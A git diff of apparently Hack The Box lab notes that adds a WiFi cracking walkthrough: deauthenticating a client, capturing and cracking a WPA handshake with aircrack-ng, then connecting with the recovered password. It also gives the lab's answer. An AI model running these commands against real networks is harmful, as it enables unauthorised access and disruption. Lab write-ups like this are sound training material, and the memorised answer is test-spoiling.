@@ -59,13 +59,15 @@ sudo mdk3 wlan0mon p -b u -c 1 -t D8:D6:3D:EB:29:D5
 ```
 ### What is the password for the WiFi network with the BSSID D8:D6:3D:EB:29:D5?
 
-Answer: 
+Answer: *minecraft*
 
 1. View the available WiFi networks. Run the following on one terminal.
 
 ```shell
-sudo airodump-ng -c 1 wlan0mon
+sudo airodump-ng -c 1 wlan0mon -w htb
 ```
+
+Some *htp-01* files will be created on the directory you are working on.
 
 2. Deauthentication. On another terminal run. (Don't close the first one)
 
@@ -78,4 +80,33 @@ sudo aireplay-ng -0 5 -a D8:D6:3D:EB:29:D5 -c 02:00:00:00:02:00 wlan0mon
 3. Come back to the first terminal.
 
 ![[WPA_handshake.png]]
-WPA handshake: D8:D6:3D:EB:29:D5
+
+
+4. Crack WPA
+
+```bash
+aircrack-ng htb-01.cap -w /opt/wordlist.txt
+```
+
+![[crack_WPA.png]]
+
+### Connect to the WiFi network and submit the flag found at IP 192.168.1.1 or 192.168.2.1
+
+1. Create file called *wpa.conf*.
+2. Add the following code and save it.
+
+```bash
+network={
+        ssid="HTB"
+        psk="minecraft"
+        scan_ssid=1
+        key_mgmt=WPA-PSK
+}
+```
+
+3. Initiate your wpa connection to the AP using the following command.
+
+```shell
+sudo wpa_supplicant -c wpa.conf -i wlan0
+```
+
